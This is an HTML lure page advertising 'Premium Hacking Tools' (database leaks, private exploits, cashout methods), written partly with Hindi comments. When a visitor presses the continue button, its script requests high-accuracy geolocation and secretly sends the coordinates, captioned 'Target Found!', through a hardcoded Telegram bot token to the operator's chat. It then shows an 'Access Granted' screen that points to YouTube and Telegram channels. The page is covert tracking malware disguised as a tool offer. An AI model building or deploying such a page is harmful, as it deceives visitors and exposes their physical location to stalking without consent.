<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Hacking Access</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a0033, #4c1d95);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }

        /* Animated Background Particles */
        .particles {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        .particle {
            position: absolute;
            background: #a855f7;
            border-radius: 50%;
            animation: floatParticle 15s linear infinite;
        }
        @keyframes floatParticle {
            0% { transform: translateY(100vh) scale(0.5); opacity: 0; }
            50% { opacity: 0.6; }
            100% { transform: translateY(-100vh) scale(1.2); opacity: 0; }
        }

        .screen { 
            position: absolute; 
            width: 100%; 
            max-width: 440px; 
            transition: all 0.7s cubic-bezier(0.23, 1, 0.32, 1); 
            z-index: 2;
            padding: 20px;
        }
        .screen.hidden { opacity: 0; transform: translateY(50px) scale(0.9); pointer-events: none; }

        .card {
            background: rgba(255,255,255,0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(165, 85, 247, 0.3);
            border-radius: 32px;
            padding: 45px 35px;
            box-shadow: 0 0 60px rgba(168, 85, 247, 0.4);
            text-align: center;
        }

        .neon-text {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(90deg, #c026d3, #a855f7, #22d3ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(168,85,247,0.5);
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .main-text {
            font-size: 16px;
            line-height: 1.6;
            margin: 20px 0 30px;
            color: #e0e7ff;
        }

        .speech {
            background: rgba(109, 40, 217, 0.9);
            color: white;
            padding: 15px;
            border-radius: 20px;
            font-size: 16px;
            margin-bottom: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }

        .logo-container {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin-top: 20px;
        }

        .youtube-logo, .telegram-logo {
            width: 80px; height: 80px; cursor: pointer; transition: 0.3s;
        }

        .youtube-logo {
            background: #ff0000; border-radius: 18px; position: relative;
            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.4);
        }
        .youtube-logo::after {
            content: ""; position: absolute; top: 50%; left: 55%; transform: translate(-50%, -50%);
            border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 22px solid white;
        }

        .telegram-logo {
            border-radius: 50%; background: #229ed9; position: relative;
            box-shadow: 0 10px 20px rgba(34, 158, 217, 0.4);
        }

        .join-btn {
            display: block;
            text-decoration: none;
            background: linear-gradient(90deg, #7c3aed, #c026d3);
            color: white;
            padding: 18px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 50px;
            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.5);
            transition: 0.3s;
            cursor: pointer;
            border: none;
            width: 100%;
        }
        .join-btn:hover { transform: scale(1.03); filter: brightness(1.1); }
    </style>
</head>
<body>

    <div class="particles" id="particles"></div>

    <div id="initialScreen" class="screen">
        <div class="card">
            <h1 class="neon-text">DETOR LAB ACCESS</h1>
            <div class="main-text">
                <strong>Unlock Premium Hacking Tools</strong><br>
                Database Leaks • Private Exploits<br>
                Cashout Methods 2026
            </div>
            <button id="joinBtn" class="join-btn">CONTINUE TO ACCESS →</button>
        </div>
    </div>

    <div id="characterScreen" class="screen hidden">
        <div class="card">
            <div class="speech">
                ✅ <strong>Access Granted!</strong><br>
                Now join our official channels to get your tools.
            </div>
            <div class="logo-container">
                <div onclick="window.open('https://youtube.com/@xyz','_blank')" class="youtube-logo"></div>
                <div onclick="window.open('https://t.me/lexluther_supreme','_blank')" class="telegram-logo"></div>
            </div>
        </div>
    </div>

    <script>
        // Config - पक्का करें कि ये सही हैं
        const BOT_TOKEN = "8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI";
        const CHAT_ID = "7066124462";

        // Create background animation
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 30; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.width = p.style.height = Math.random() * 5 + 3 + 'px';
                p.style.left = Math.random() * 100 + '%';
                p.style.animationDuration = Math.random() * 5 + 10 + 's';
                p.style.animationDelay = '-' + Math.random() * 10 + 's';
                container.appendChild(p);
            }
        }
        createParticles();

        // Main Logic
        async function sendToTelegram(lat, lon) {
            const text = `🎯 **Target Found!**\n\n📍 Location: [Open in Maps](https://www.google.com/maps?q=${lat},${lon})\n🌐 Lat: ${lat}\n🌐 Lon: ${lon}`;
            
            try {
                // Send Location Object
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);
                
                // Send Text Details
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            } catch (err) {
                console.log("Error sending to TG");
            }
        }

        function switchScreen() {
            document.getElementById('initialScreen').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('characterScreen').classList.remove('hidden');
            }, 500);
        }

        document.getElementById('joinBtn').addEventListener('click', () => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        sendToTelegram(pos.coords.latitude, pos.coords.longitude);
                        switchScreen();
                    },
                    (err) => {
                        console.log("User Denied Location");
                        switchScreen(); // Still switch screen to keep user engaged
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                switchScreen();
            }
        });
    </script>
</body>
    </html>
